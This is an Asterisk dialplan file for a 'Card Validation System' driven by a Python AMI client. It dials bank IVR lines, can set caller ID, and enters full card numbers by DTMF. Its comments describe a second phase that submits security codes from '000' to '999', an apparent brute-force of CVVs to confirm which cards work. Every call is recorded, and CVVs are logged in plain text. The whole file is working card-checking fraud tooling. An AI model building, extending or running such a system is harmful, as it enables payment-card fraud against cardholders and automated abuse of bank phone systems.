; Card Validation System - Asterisk Dialplan
;
; ALL timings and the SIP trunk endpoint are driven by channel variables
; passed in from the Python AMI Originate action. That means:
;   - switch provider/signalwire<->twilio: change env vars, don't edit this file
;   - tune waits for slow/fast IVR: change env vars, don't edit this file
;
; Variables the Python side MUST send:
;   CALL_ID
;   IVR_NUMBER          (e.g. 18003679617)
;   CARD_NUMBER
;   SECURITY_CODE       ("" = Phase 1 only, "000".."999" = Phase 2 attempt)
;   RECORD_FILE         (absolute /path/to/recording.wav)
;   OUTBOUND_TRUNK      (SIP endpoint name such as signalwire / twilio)
;   CALLER_ID_NUM
;
; Optional timing variables (Python-side defaults come from env):
;   WAIT_CONNECT_S      (default 2)  silence after answer before card DTMF
;   WAIT_AFTER_CARD_S   (default 6)  silence after card DTMF (listen for CVV prompt)
;   WAIT_AFTER_CVV_S    (default 5)  silence after CVV DTMF (listen for success/fail)
;   DTMF_ON_MS          (default 100)
;   DTMF_OFF_MS         (default 200)

[card-validation]
exten => s,1,NoOp(=== Card Validation Call === CALL_ID=${CALL_ID} TRUNK=${OUTBOUND_TRUNK})
 same => n,Set(OUTBOUND_TRUNK=${IF($["${OUTBOUND_TRUNK}"!=""]?${OUTBOUND_TRUNK}:signalwire)})
 same => n,Gosub(e164-normalize,s,1(${IVR_NUMBER}))
 same => n,Set(IVR_NUMBER=${NUMBER_NORMALIZED})
 same => n,Set(DIAL_NUMBER=${IF($["${DIAL_NUMBER}"!=""]?${DIAL_NUMBER}:${IVR_NUMBER})})
 same => n,GotoIf($["${CALLER_ID_NUM}"!=""]?setcid)
 same => n,Goto(dial)
 same => n(setcid),Set(CALLERID(num)=${CALLER_ID_NUM})
 same => n,Set(CALLERID(name)=CardValidation)
 same => n(dial),Dial(SIP/${OUTBOUND_TRUNK}/${DIAL_NUMBER},120,U(card-val-gosub^${RECORD_FILE}^${CARD_NUMBER}^${SECURITY_CODE}^${CALL_ID}))
 same => n,NoOp(Dial completed: status=${DIALSTATUS})
 same => n,Hangup()

[card-validation-process]
exten => s,1,NoOp(Card validation process ARG4=${ARG4} CALL_ID=${CALL_ID})
 same => n,Set(REC=${IF($["${ARG1}"!=""]?${ARG1}:${RECORD_FILE})})
 same => n,Set(CARD=${IF($["${ARG2}"!=""]?${ARG2}:${CARD_NUMBER})})
 same => n,Set(SECURITY=${IF($["${ARG3}"!=""]?${ARG3}:${SECURITY_CODE})})
 same => n,Set(CID=${IF($["${ARG4}"!=""]?${ARG4}:${CALL_ID})})

 same => n,Set(WAIT_CONNECT_S=${IF($["${WAIT_CONNECT_S}"!=""]?${WAIT_CONNECT_S}:2)})
 same => n,Set(WAIT_AFTER_CARD_S=${IF($["${WAIT_AFTER_CARD_S}"!=""]?${WAIT_AFTER_CARD_S}:6)})
 same => n,Set(WAIT_AFTER_CVV_S=${IF($["${WAIT_AFTER_CVV_S}"!=""]?${WAIT_AFTER_CVV_S}:5)})
 same => n,Set(DTMF_ON_MS=${IF($["${DTMF_ON_MS}"!=""]?${DTMF_ON_MS}:100)})
 same => n,Set(DTMF_OFF_MS=${IF($["${DTMF_OFF_MS}"!=""]?${DTMF_OFF_MS}:200)})

 same => n,GotoIf($["${CALLER_ID_NUM}"!=""]?setcid2)
 same => n,Goto(startmon)
 same => n(setcid2),Set(CALLERID(num)=${CALLER_ID_NUM})
 same => n,Set(CALLERID(name)=CardValidation)

 ; Do not use the bridge-only 'b' option here. This subroutine can run on the
 ; answered outbound channel itself, and 'b' would produce header-only wavs.
 ; 'a' = append mode (safe if parent already started MixMonitor on same file).
 ; 'm' = create parent dirs if needed (e.g. /var/spool/asterisk/monitor).
 same => n(startmon),MixMonitor(${REC},am,)
 same => n,Wait(${WAIT_CONNECT_S})

 same => n,SendDTMF(${CARD},${DTMF_ON_MS},${DTMF_OFF_MS})
 same => n,NoOp(Card number submitted: ****${CARD:-4})
 same => n,Wait(${WAIT_AFTER_CARD_S})

 same => n,GotoIf($["${SECURITY}"!=""]?send_security)
 same => n,Goto(finish)

 same => n(send_security),SendDTMF(${SECURITY},${DTMF_ON_MS},${DTMF_OFF_MS})
 same => n,NoOp(Security code submitted: ${SECURITY})
 same => n,Wait(${WAIT_AFTER_CVV_S})

 same => n(finish),StopMixMonitor()
 same => n,Hangup()
 same => n,Return()

; --------------------------------------------------------------------
; card-val-gosub - GOSUB ENTRYPOINT LAUNCHED BY AMI Originate.
;
; Python ivr_client.py Action: Originate uses:
;   Channel     = SIP/<peer>/<bank number>       (direct SIP outbound)
;   Application = Gosub
;   Data        = card-val-gosub,s,1(REC,CARD,SEC,CALLID)
;
; This runs the moment the outbound SIP leg is actually ANSWERED by
; the bank IVR.  We are on the live answered channel.
;
; Gosub arguments (comma-separated from AMI Data line):
;   ARG1 = RECORD_FILE   (absolute wav path from Python _recording_file)
;   ARG2 = CARD_NUMBER   (full PAN)
;   ARG3 = SECURITY_CODE (CVV, empty for phase-1 check)
;   ARG4 = CALL_ID       (unique id, used in filename too)
;
; JOBS: (1) start MixMonitor on the answered leg FIRST THING,
;       (2) then Gosub into card-validation-process with all args so
;           DTMF is played.
; --------------------------------------------------------------------
[card-val-gosub]
exten => s,1,NoOp(card-val-gosub ENTRY via AMI Gosub ANSWERED-LEG ARG1=${ARG1} ARG2(L4)=${ARG2:(-4):4} ARG3len=${LEN(${ARG3})} ARG4=${ARG4})
 same => n,Set(CALL_ID_V=${IF($["${ARG4}"!=""]?${ARG4}:${CALL_ID})})
 same => n,Set(REC_FROM_AMI=${ARG1})
 same => n,Set(MON_DIR=/var/spool/asterisk/monitor)
 same => n,Set(REC_PATH_FROM_CALLID=${MON_DIR}/ivr-${CALL_ID_V}.wav)
 same => n,Set(REC_PATH=${IF($["${REC_FROM_AMI}"!=""]?${REC_FROM_AMI}:${REC_PATH_FROM_CALLID})})
 same => n,System(mkdir -p ${MON_DIR})
 same => n,Answer()
 same => n,Wait(1)
 same => n,MixMonitor(${REC_PATH},am,)
 same => n,Wait(1)
 same => n,Gosub(card-validation-process,s,1(${REC_PATH},${ARG2},${ARG3},${CALL_ID_V}))
 same => n,StopMixMonitor()
 same => n,System(chmod 644 ${REC_PATH} 2>/dev/null || true)
 same => n,Return()

[e164-normalize]
; ARG1 = raw number. Output: NUMBER_NORMALIZED
exten => s,1,Set(_DIG=${FILTER(0123456789,${ARG1})})
 same => n,GotoIf($[${LEN(${_DIG})}=11]?us11)
 same => n,GotoIf($[${LEN(${_DIG})}=10]?us10)
 same => n,Set(NUMBER_NORMALIZED=+${_DIG})
 same => n,Return()
 same => n(us11),Set(NUMBER_NORMALIZED=+${_DIG})
 same => n,Return()
 same => n(us10),Set(NUMBER_NORMALIZED=+1${_DIG})
 same => n,Return()
